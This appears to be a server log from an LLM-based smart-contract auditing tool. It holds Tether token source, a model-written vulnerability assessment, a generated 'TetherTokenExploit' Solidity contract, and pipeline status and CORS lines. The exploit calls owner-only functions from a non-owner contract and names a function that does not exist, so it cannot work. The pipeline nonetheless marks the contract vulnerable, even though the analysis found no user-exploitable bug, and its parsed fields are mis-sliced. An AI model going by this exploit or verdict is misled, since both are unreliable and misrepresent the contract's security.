@dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': "1. **Contract Analysis:**\n\nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Implements pausing/unpausing by owner.\n- Implements blacklisting of addresses by owner, with ability to destroy blacklisted funds.\n- Supports upgradeability via `deprecated` flag and forwarding calls to an upgraded contract.\n- Implements fees on transfers (basis points rate and max fee) adjustable by owner.\n- Owner can mint (`issue`) and burn (`redeem`) tokens.\n- Uses SafeMath for arithmetic safety.\n- Has protections against short address attack via `onlyPayloadSize` modifier.\n- Implements the known ERC20 approve race condition mitigation by requiring allowance to be zero before changing it to a non-zero value.\n- Owner has significant control: can pause/unpause, blacklist/unblacklist users, destroy blacklisted funds, issue and redeem tokens, set fees, and deprecate the contract.\n\nThe contract is written in Solidity version pragma `^0.4.17`.\n\n2. **Vulnerability Assessment:**\n\n- **Centralization / Owner Privileges:**\n  - Owner can arbitrarily blacklist any user and destroy their token balances permanently (`destroyBlackFunds`).\n  - Owner can pause all token transfers (`pause`), effectively freezing user funds.\n  - Owner can mint unlimited tokens (`issue`), inflating supply and diluting holders.\n  - Owner can burn tokens from their own balance (`redeem`).\n  - Owner can deprecate the contract and redirect calls to an upgraded contract, which could be malicious.\n  \n  **Impact:** High trust required in owner. Malicious or compromised owner can censor users, confiscate tokens, inflate supply, or redirect users to malicious upgraded contracts.\n\n- **No ETH Handling / No Reentrancy:**\n  - The contract does not hold or manage ETH, so no reentrancy or ETH theft risks.\n  \n- **Approve Race Condition Mitigation:**\n  - The contract enforces allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **Fee Parameters Limits:**\n  - Owner can set fees but capped at 0.2% (basisPointsRate < 20) and max fee < 50 tokens (adjusted by decimals).\n  - This prevents excessive fees but still allows some fee extraction by owner.\n\n- **Upgradeability Risks:**\n  - The `deprecated` flag and `upgradedAddress` allow owner to redirect token operations to a new contract.\n  - No on-chain governance or user consent required.\n  - The upgraded contract could have arbitrary code, potentially malicious.\n  \n  **Impact:** Owner can replace token logic arbitrarily, potentially stealing tokens or locking users out.\n\n- **BlackList Mechanism:**\n  - Blacklisted users cannot transfer tokens.\n  - Owner can destroy blacklisted users' tokens.\n  \n  **Impact:** Owner can censor and confiscate tokens from any user.\n\n- **No Event Emission on Ownership Transfer:**\n  - `transferOwnership` does not emit an event.\n  \n  **Impact:** Minor, but reduces transparency.\n\n- **Use of Deprecated Solidity Version:**\n  - Solidity 0.4.17 is very old and lacks many modern safety features.\n  \n  **Impact:** Potential for subtle bugs or incompatibilities, but no direct vulnerability found here.\n\n3. **Exploitation Requirements:**\n\n- Exploitation requires control of the **owner** account.\n- If attacker gains owner private key or if owner is malicious, they can:\n  - Blacklist any user and destroy their tokens.\n  - Pause the contract to freeze transfers.\n  - Mint unlimited tokens to themselves.\n  - Deprecate the contract and redirect to malicious upgraded contract.\n- No direct user-exploitable bugs or reentrancy issues found.\n- No setup required other than owner compromise.\n\n---\n\n**Summary:**\n\n- **Solidity Version:** pragma solidity ^0.4.17\n- **Main Vulnerabilities:** Centralization risks due to extensive owner privileges (blacklisting, minting, pausing, upgradeability).\n- **No technical bugs like reentrancy or math errors found.**\n- **Users must trust owner not to abuse powers.**", 'reasoning': '**\n\nThe main contract with business logic and user funds is **TetherToken**, an ERC20 token implementation with additional features:\n\n- It inherits from `Pausable`, `StandardToken`, and `BlackList`.\n- Implements pausing/unpausing by owner.\n- Implements blacklisting of addresses by owner, with ability to destroy blacklisted funds.\n- Supports upgradeability via `deprecated` flag and forwarding calls to an upgraded contract.\n- Implements fees on transfers (basis points rate and max fee) adjustable by owner.\n- Owner can mint (`issue`) and burn (`redeem`) tokens.\n- Uses SafeMath for arithmetic safety.\n- Has protections against short address attack via `onlyPayloadSize` modifier.\n- Implements the known ERC20 approve race condition mitigation by requiring allowance to be zero before changing it to a non-zero value.\n- Owner has significant control: can pause/unpause, blacklist/unblacklist users, destroy blacklisted funds, issue and redeem tokens, set fees, and deprecate the contract.\n\nThe contract is written in Solidity version pragma `^0.4.17`.\n\n2. **', 'summary': "**\n\n- **Centralization / Owner Privileges:**\n  - Owner can arbitrarily blacklist any user and destroy their token balances permanently (`destroyBlackFunds`).\n  - Owner can pause all token transfers (`pause`), effectively freezing user funds.\n  - Owner can mint unlimited tokens (`issue`), inflating supply and diluting holders.\n  - Owner can burn tokens from their own balance (`redeem`).\n  - Owner can deprecate the contract and redirect calls to an upgraded contract, which could be malicious.\n  \n  **Impact:** High trust required in owner. Malicious or compromised owner can censor users, confiscate tokens, inflate supply, or redirect users to malicious upgraded contracts.\n\n- **No ETH Handling / No Reentrancy:**\n  - The contract does not hold or manage ETH, so no reentrancy or ETH theft risks.\n  \n- **Approve Race Condition Mitigation:**\n  - The contract enforces allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.\n\n- **Fee Parameters Limits:**\n  - Owner can set fees but capped at 0.2% (basisPointsRate < 20) and max fee < 50 tokens (adjusted by decimals).\n  - This prevents excessive fees but still allows some fee extraction by owner.\n\n- **Upgradeability Risks:**\n  - The `deprecated` flag and `upgradedAddress` allow owner to redirect token operations to a new contract.\n  - No on-chain governance or user consent required.\n  - The upgraded contract could have arbitrary code, potentially malicious.\n  \n  **Impact:** Owner can replace token logic arbitrarily, potentially stealing tokens or locking users out.\n\n- **BlackList Mechanism:**\n  - Blacklisted users cannot transfer tokens.\n  - Owner can destroy blacklisted users' tokens.\n  \n  **Impact:** Owner can censor and confiscate tokens from any user.\n\n- **No Event Emission on Ownership Transfer:**\n  - `transferOwnership` does not emit an event.\n  \n  **Impact:** Minor, but reduces transparency.\n\n- **Use of Deprecated Solidity Version:**\n  - Solidity 0.4.17 is very old and lacks many modern safety features.\n  \n  **Impact:** Potential for subtle bugs or incompatibilities, but no direct vulnerability found here.\n\n3. **", 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function pause() external;\n    function issue(uint256 amount) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, uint256 mintAmount, address upgradedAddress) public {\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.pause();\n        target.issue(mintAmount);\n        target.deprecate(upgradedAddress);\n    }\n}', 'code_type': 'solidity', 'duration': 21.148311376571655}
2025-07-05 13:23:14,491 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:23:14,492 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:23:14,494 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:23:14,495 - app.services.contract_service - INFO - Attack strategy summary: **

- **Centralization / Owner Privileges:**
  - Owner can arbitrarily blacklist any user and destroy their token balances permanently (`destroyBlackFunds`).
  - Owner can pause all token transfers (`pause`), effectively freezing user funds.
  - Owner can mint unlimited tokens (`issue`), inflating supply and diluting holders.
  - Owner can burn tokens from their own balance (`redeem`).
  - Owner can deprecate the contract and redirect calls to an upgraded contract, which could be malicious.
  
  **Impact:** High trust required in owner. Malicious or compromised owner can censor users, confiscate tokens, inflate supply, or redirect users to malicious upgraded contracts.

- **No ETH Handling / No Reentrancy:**
  - The contract does not hold or manage ETH, so no reentrancy or ETH theft risks.
  
- **Approve Race Condition Mitigation:**
  - The contract enforces allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 approve race condition.

- **Fee Parameters Limits:**
  - Owner can set fees but capped at 0.2% (basisPointsRate < 20) and max fee < 50 tokens (adjusted by decimals).
  - This prevents excessive fees but still allows some fee extraction by owner.

- **Upgradeability Risks:**
  - The `deprecated` flag and `upgradedAddress` allow owner to redirect token operations to a new contract.
  - No on-chain governance or user consent required.
  - The upgraded contract could have arbitrary code, potentially malicious.
  
  **Impact:** Owner can replace token logic arbitrarily, potentially stealing tokens or locking users out.

- **BlackList Mechanism:**
  - Blacklisted users cannot transfer tokens.
  - Owner can destroy blacklisted users' tokens.
  
  **Impact:** Owner can censor and confiscate tokens from any user.

- **No Event Emission on Ownership Transfer:**
  - `transferOwnership` does not emit an event.
  
  **Impact:** Minor, but reduces transparency.

- **Use of Deprecated Solidity Version:**
  - Solidity 0.4.17 is very old and lacks many modern safety features.
  
  **Impact:** Potential for subtle bugs or incompatibilities, but no direct vulnerability found here.

3. **
2025-07-05 13:23:14,497 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:23:14,499 - app.services.contract_service - INFO - Temporary file /tmp/tmpi6hdzhyj.sol removed
2025-07-05 13:23:14,524 - app.api.contract - INFO - Report saved with filename: Ownable_2025-07-05_13-23, status: KO
2025-07-05 13:23:14,526 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 13:23:14,530 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:23:14,532 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:23:14,533 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:23:14,534 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:23:14,537 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:23:14] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:23:15,367 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:23:15,370 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:23:15,372 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:23:15,375 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:23:15,377 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:23:15] "GET /history HTTP/1.1" 200 -
2025-07-05 13:23:37,655 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:23:37,662 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:23:37,665 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:23:37,669 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:23:37,673 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:23:37] "OPTIONS /feedback HTTP/1.1" 200 -
2025-07-05 13:23:37,688 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:23:37,741 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 1, statut: OK, poids de la requ√™te: 3.0
2025-07-05 13:23:37,743 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:23:37,745 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:23:37,746 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:23:37,747 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:23:37,750 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:23:37] "POST /feedback HTTP/1.1" 200 -
2025-07-05 13:23:40,920 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:23:40,923 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:23:40,927 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:23:40,930 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:23:40,934 - werkzeug - INFO - 192.168.160.1 - - [05/Jul/2025 13:23:40] "GET /history HTTP/1.1" 200 -
2025-07-05 13:28:14,167 - flask_cors.extension - DEBUG - Request to ''/analysis/status/2'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:28:14,170 - flask_cors.extension - DEBUG - Request to ''/analysis/status/1'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:28:14,176 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:28:14,179 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:28:14,181 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:28:14,186 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:28:14,189 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:28:14,194 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:28:14,197 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:28:14,199 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
